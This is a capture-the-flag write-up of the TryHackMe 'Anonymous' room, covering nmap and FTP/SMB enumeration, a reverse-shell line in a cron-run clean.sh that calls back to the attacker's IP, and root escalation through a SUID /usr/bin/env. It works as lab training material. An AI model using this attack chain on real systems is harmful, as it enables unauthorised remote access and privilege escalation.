

## Enum
Move to Anonymous folder.
Scan with `Nmap`
```bash
mkdir enum
export IP=10.10.192.227
ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -sC -sV -p$ports $IP -oA enum/full
```
Output
```bash
# Nmap 7.92 scan initiated Tue Sep 13 07:56:52 2022 as: nmap -sC -sV -p21,22,139,445 -oA enum/full 10.10.192.227
Nmap scan report for 10.10.192.227
Host is up (0.23s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.17.7.26
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2022-09-13T14:57:06
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2022-09-13T14:57:06+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 13 07:57:14 2022 -- 1 IP address (1 host up) scanned in 21.93 seconds
```
Summary:

| Service | Port | Version | Note |
| ----------- | ----------- |----------- | ----------- |
| FTP | 21 | vsftpd 2.0.8 or later | anonymous login available |
| SSH | 22 | OpenSSH 7.6p1 | |
| SMB | 139 | smbd 3.X - 4.X | |
| SMB | 445 | smbd 4.7.6-Ubuntu | using SMB version 2 |

## Foothold
### FTP
- We have `FTP` port open and can be login with `anonymous`
```bash
┌──(bop㉿Matrix)-[~/Workspace/tryhackme/anonymous]
└─$ ftp $IP
Connected to 10.10.192.227.
220 NamelessOne's FTP Server!
Name (10.10.192.227:bop): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

There a folder call `scripts`
```bash
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> ls
cd 229 Entering Extended Passive Mode (|||7376|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1720 Sep 13 15:04 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```
We downloads all of this file to our machine.

- `to_do.txt`
```bash
I really need to disable the anonymous login...it's really not safe
```

- `clean.sh`
```bash
#!/bin/bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
- `removed_files.log`
```bash
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
...
```
Based on logs, I think there will have crontab to run `clean.sh`.
Lets take a look at other services.

### SMB
There a folder share name `pics` and we have anonymous access.



```bash
┌──(bop㉿Matrix)-[~/Workspace/tryhackme/anonymous]
└─$ smbclient -L \\$IP


┌──(bop㉿Matrix)-[~/Workspace/tryhackme/anonymous]
└─$ smbclient \\\\$IP\\pics
Password for [WORKGROUP\bop]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 04:11:34 2020
  ..                                  D        0  Wed May 13 18:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 17:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 17:43:42 2020
```

check `exiftool` with 2 images, nothing.

## RCE

We can tried to add reverse shell to `clean.sh` and wait till the `cronjob` execute it.

We make a `clean.sh` on our local machine like below

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.17.7.26/1234 0>&1
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
We upload the file using FTP.

```bash
┌──(bop㉿Matrix)-[~/Workspace/tryhackme/anonymous]
└─$ ftp $IP
Connected to 10.10.192.227.
220 NamelessOne's FTP Server!
Name (10.10.192.227:bop): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd scripts
250 Directory successfully changed.
ftp> put clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||30532|)
150 Ok to send data.
100% |********************************************************************************************************************************************************************|   354        1.70 MiB/s    00:00 ETA
226 Transfer complete.
354 bytes sent in 00:00 (0.75 KiB/s)
ftp>
ftp> ls
229 Entering Extended Passive Mode (|||14910|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          354 Sep 13 15:51 clean.sh
-rw-rw-r--    1 1000     1000         3741 Sep 13 15:51 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp>

```

Open reverse on other window.

```bash
┌──(bop㉿Matrix)-[~/Workspace/tryhackme/anonymous]
└─$ rlwrap nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.17.7.26] from (UNKNOWN) [10.10.192.227] 49850
bash: cannot set terminal process group (1580): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$

namelessone@anonymous:~$
```
And we have shell.
## Escalate privilege


- `/etc/passwd`

```bash
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
namelessone:x:1000:1000:namelessone:/home/namelessone:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
ftp:x:111:113:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

- `id`

```bash
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
namelessone@anonymous:~$
```
There so much group.

- `find` `SUID`

```bash
find / -type f -perm -u=s 2>/dev/null | grep -v "snap"
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/pkexec
namelessone@anonymous:~$
```

At this step i think there many way to escalate privilege.

1.  `/usr/bin/env`

[https://gtfobins.github.io/gtfobins/env/](https://gtfobins.github.io/gtfobins/env/)
```bash
-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env
/usr/bin/env /bin/bash -p
/usr/bin/env /bin/bash -p

id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
cd /root
ls
root.txt
```
2.  `lxd` group
Follow the LXD Cheatsheet at [Cheatsheet\LXD Cheatsheet.md](Cheatsheet\LXD Cheatsheet.md)
